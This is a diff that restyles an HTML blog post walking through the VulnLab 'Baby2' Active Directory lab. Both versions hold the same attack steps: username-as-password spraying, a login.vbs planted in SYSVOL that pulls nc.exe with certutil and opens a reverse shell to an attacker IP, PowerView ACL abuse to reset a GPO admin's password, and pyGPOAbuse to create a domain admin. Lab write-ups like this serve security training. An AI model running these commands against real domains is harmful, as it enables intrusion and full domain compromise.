@@ -1,1 +1,173 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access to amelia.griffiths</u></strong></span></p><p>&nbsp;</p><p>SMB access</p><figure class="image"><img style="aspect-ratio:1205/649;" src="../img/posts/2025-03-10-Baby2(VulnLab)/01-6a155fdaee.png" width="1205" height="649"></figure><p>&nbsp;</p><p>Users found</p><p>Amelia.Griffiths<br>Carl.Moore<br>Harry.Shaw<br>Joan.Jennings<br>Joel.Hurst<br>Kieran.Mitchell<br>library<br>Lynda.Bailey<br>Mohammed.Harris<br>Nicola.Lamb&nbsp;<br>Ryan.Jenkins<br>&nbsp;</p><p>&nbsp;</p><p>Using the usernames as passwords we get a couple hits</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1196/246;" src="../img/posts/2025-03-10-Baby2(VulnLab)/02-167276d882.png" width="1196" height="246"></figure><p>&nbsp;</p><p>library:library</p><p>Carl.Moore:Carl.Moore</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1348/639;" src="../img/posts/2025-03-10-Baby2(VulnLab)/03-847dfa088c.png" width="1348" height="639"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Apparently we have write access to SYSVOL even though it says we dont.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:874/198;" src="../img/posts/2025-03-10-Baby2(VulnLab)/04-ce785dc2ed.png" width="874" height="198"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can put a reverse shell into a vbs script and upload it. The netlogon script is autorunning login.vbs when someone signs in.</p><p>&nbsp;</p><p>malicious login.vbs script</p><p><code>└─$ cat login.vbs</code><br><code>Set oShell = CreateObject("Wscript.Shell")</code><br><code>oShell.run "cmd.exe /c mkdir C:\Temp"</code><br><code>oShell.run "cmd.exe /c certutil -urlcache -f http://10.8.5.199:80/nc.exe C:\Temp\nc.exe"</code><br><code>oShell.run "cmd.exe /c C:\Temp\nc.exe 10.8.5.199 443 -e cmd.exe"</code></p><p>&nbsp;</p><p>&nbsp;</p><p>Once done we get a reverse shell from amelia.griffiths</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:566/219;" src="../img/posts/2025-03-10-Baby2(VulnLab)/05-bf6951646d.png" width="566" height="219"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as GPOADMIN</u></strong></span></p><p>&nbsp;</p><pre><code class="language-text-plain">$Cred = New-Object System.Management.Automation.PSCredential('baby2.vl\amelia.griffiths')</code></pre><p><br>Set-DomainObjectOwner -Identity GPOADM -OwnerIdentity amelia.griffiths</p><pre><code class="language-text-plain">Add-DomainObjectAcl -TargetIdentity GPOADM -PrincipalIdentity amelia.griffiths -Rights All</code></pre><p>&nbsp;</p><pre><code class="language-text-plain">Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword</code></pre><p>&nbsp;</p><p>We have write owner over GPOADM</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:994/379;" src="../img/posts/2025-03-10-Baby2(VulnLab)/06-c3ec65924d.png" width="994" height="379"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Write Owner</p><p><code>$Cred = New-Object System.Management.Automation.PSCredential('baby2.vl\amelia.griffiths')</code></p><p><code>Set-DomainObjectOwner -Identity GPOADM -OwnerIdentity amelia.griffiths</code></p><p><code>Add-DomainObjectAcl -TargetIdentity GPOADM -Rights All</code></p><p>&nbsp;</p><p>&nbsp;</p><p>Now that we have all rights over GPOADM we can force password change</p><p>&nbsp;</p><p>Force password change</p><p><code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></p><p><code>Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword</code></p><p>&nbsp;</p><p>&nbsp;</p><p>We can confirm it works with netexec</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1220/287;" src="../img/posts/2025-03-10-Baby2(VulnLab)/07-f1d79c11ab.png" width="1220" height="287"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Privilege Escalation to Administrator</u></strong></span></p><p>&nbsp;</p><p>We have generic all over default domain policy</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:935/487;" src="../img/posts/2025-03-10-Baby2(VulnLab)/08-dc756c8bf6.png" width="935" height="487"></figure><p>&nbsp;</p><p>Abuse info from bloodhound</p><p>https://github.com/Hackndo/pyGPOAbuse</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:598/348;" src="../img/posts/2025-03-10-Baby2(VulnLab)/09-b3746209fd.png" width="598" height="348"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>This exploit will create a malicious GPO that when ran creates a new admin user named John and with the password H4x00r123..</p><p>&nbsp;</p><p>We first need the gpo-id which we can get from bloodhound</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:670/637;" src="../img/posts/2025-03-10-Baby2(VulnLab)/10-4f2392a306.png" width="670" height="637"></figure><p>&nbsp;</p><p>Then we need an ntlm hash. We can use the website below to convert a cleartext password to an lm hash</p><p>https://www.browserling.com/tools/ntlm-hash</p><p>&nbsp;</p><p>&nbsp;</p><p>With this we have everything we need to run the exploit</p><p><code>python3 pygpoabuse.py baby2.vl/GPOADM -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"</code><br>&nbsp;</p><p>&nbsp;</p><p>We can confirm it worked by running netexec again</p><figure class="image"><img style="aspect-ratio:1217/418;" src="../img/posts/2025-03-10-Baby2(VulnLab)/11-a60723bb75.png" width="1217" height="418"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can now remote in and get the admin flag</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.85.232 -u john -p H4x00r123..&nbsp;</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:771/431;" src="../img/posts/2025-03-10-Baby2(VulnLab)/12-0b27dd001c.png" width="771" height="431"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:526/609;" src="../img/posts/2025-03-10-Baby2(VulnLab)/13-6b08821360.png" width="526" height="609"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>VulnLab: Baby2 | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-03-10-Baby2(VulnLab)/01-6a155fdaee.png" alt="VulnLab: Baby2 cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">VulnLab: Baby2</h1>
+                <div class="post-meta">March 10, 2025 &bull; VulnLab</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Access to amelia.griffiths</h1>
+
+        <p>SMB access</p>
+
+        <img alt="Screenshot 1" height="649" src="../img/posts/2025-03-10-Baby2(VulnLab)/01-6a155fdaee.png" style="aspect-ratio:1205/649;" width="1205"/>
+
+        <p>Users found</p>
+
+        <p>Amelia.Griffiths<br/>Carl.Moore<br/>Harry.Shaw<br/>Joan.Jennings<br/>Joel.Hurst<br/>Kieran.Mitchell<br/>library<br/>Lynda.Bailey<br/>Mohammed.Harris<br/>Nicola.Lamb <br/>Ryan.Jenkins<br/> </p>
+
+        <p>Using the usernames as passwords we get a couple hits</p>
+
+        <img alt="Screenshot 2" height="246" src="../img/posts/2025-03-10-Baby2(VulnLab)/02-167276d882.png" style="aspect-ratio:1196/246;" width="1196"/>
+
+        <p>library:library</p>
+
+        <p>Carl.Moore:Carl.Moore</p>
+
+        <img alt="Screenshot 3" height="639" src="../img/posts/2025-03-10-Baby2(VulnLab)/03-847dfa088c.png" style="aspect-ratio:1348/639;" width="1348"/>
+
+        <p>Apparently we have write access to SYSVOL even though it says we dont.</p>
+
+        <img alt="Screenshot 4" height="198" src="../img/posts/2025-03-10-Baby2(VulnLab)/04-ce785dc2ed.png" style="aspect-ratio:874/198;" width="874"/>
+
+        <p>We can put a reverse shell into a vbs script and upload it. The netlogon script is autorunning login.vbs when someone signs in.</p>
+
+        <p>malicious login.vbs script</p>
+
+        <p><code>└─$ cat login.vbs</code><br/><code>Set oShell = CreateObject("Wscript.Shell")</code><br/><code>oShell.run "cmd.exe /c mkdir C:\Temp"</code><br/><code>oShell.run "cmd.exe /c certutil -urlcache -f http://10.8.5.199:80/nc.exe C:\Temp\nc.exe"</code><br/><code>oShell.run "cmd.exe /c C:\Temp\nc.exe 10.8.5.199 443 -e cmd.exe"</code></p>
+
+        <p>Once done we get a reverse shell from amelia.griffiths</p>
+
+        <img alt="Screenshot 5" height="219" src="../img/posts/2025-03-10-Baby2(VulnLab)/05-bf6951646d.png" style="aspect-ratio:566/219;" width="566"/>
+
+        <h1 style="color:red;">Access as GPOADMIN</h1>
+
+        <pre class="terminal"><code>$Cred = New-Object System.Management.Automation.PSCredential('baby2.vl\amelia.griffiths')</code></pre>
+
+        <p><br/>Set-DomainObjectOwner -Identity GPOADM -OwnerIdentity amelia.griffiths</p>
+
+        <pre class="terminal"><code>Add-DomainObjectAcl -TargetIdentity GPOADM -PrincipalIdentity amelia.griffiths -Rights All</code></pre>
+
+        <pre class="terminal"><code>Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword</code></pre>
+
+        <p>We have write owner over GPOADM</p>
+
+        <img alt="Screenshot 6" height="379" src="../img/posts/2025-03-10-Baby2(VulnLab)/06-c3ec65924d.png" style="aspect-ratio:994/379;" width="994"/>
+
+        <p>Write Owner</p>
+
+        <pre class="terminal"><code>$Cred = New-Object System.Management.Automation.PSCredential('baby2.vl\amelia.griffiths')</code></pre>
+
+        <pre class="terminal"><code>Set-DomainObjectOwner -Identity GPOADM -OwnerIdentity amelia.griffiths</code></pre>
+
+        <pre class="terminal"><code>Add-DomainObjectAcl -TargetIdentity GPOADM -Rights All</code></pre>
+
+        <p>Now that we have all rights over GPOADM we can force password change</p>
+
+        <p>Force password change</p>
+
+        <pre class="terminal"><code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
+
+        <pre class="terminal"><code>Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword</code></pre>
+
+        <p>We can confirm it works with netexec</p>
+
+        <img alt="Screenshot 7" height="287" src="../img/posts/2025-03-10-Baby2(VulnLab)/07-f1d79c11ab.png" style="aspect-ratio:1220/287;" width="1220"/>
+
+        <h1 style="color:red;">Privilege Escalation to Administrator</h1>
+
+        <p>We have generic all over default domain policy</p>
+
+        <img alt="Screenshot 8" height="487" src="../img/posts/2025-03-10-Baby2(VulnLab)/08-dc756c8bf6.png" style="aspect-ratio:935/487;" width="935"/>
+
+        <p>Abuse info from bloodhound</p>
+
+        <p>https://github.com/Hackndo/pyGPOAbuse</p>
+
+        <img alt="Screenshot 9" height="348" src="../img/posts/2025-03-10-Baby2(VulnLab)/09-b3746209fd.png" style="aspect-ratio:598/348;" width="598"/>
+
+        <p>This exploit will create a malicious GPO that when ran creates a new admin user named John and with the password H4x00r123..</p>
+
+        <p>We first need the gpo-id which we can get from bloodhound</p>
+
+        <img alt="Screenshot 10" height="637" src="../img/posts/2025-03-10-Baby2(VulnLab)/10-4f2392a306.png" style="aspect-ratio:670/637;" width="670"/>
+
+        <p>Then we need an ntlm hash. We can use the website below to convert a cleartext password to an lm hash</p>
+
+        <p>https://www.browserling.com/tools/ntlm-hash</p>
+
+        <p>With this we have everything we need to run the exploit</p>
+
+        <pre class="terminal"><code>python3 pygpoabuse.py baby2.vl/GPOADM -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"</code></pre>
+
+        <p>We can confirm it worked by running netexec again</p>
+
+        <img alt="Screenshot 11" height="418" src="../img/posts/2025-03-10-Baby2(VulnLab)/11-a60723bb75.png" style="aspect-ratio:1217/418;" width="1217"/>
+
+        <p>We can now remote in and get the admin flag</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.85.232 -u john -p H4x00r123..</code></pre>
+
+        <img alt="Screenshot 12" height="431" src="../img/posts/2025-03-10-Baby2(VulnLab)/12-0b27dd001c.png" style="aspect-ratio:771/431;" width="771"/>
+
+        <img alt="Screenshot 13" height="609" src="../img/posts/2025-03-10-Baby2(VulnLab)/13-6b08821360.png" style="aspect-ratio:526/609;" width="526"/>
+    </article>
+
+</body>
+</html>
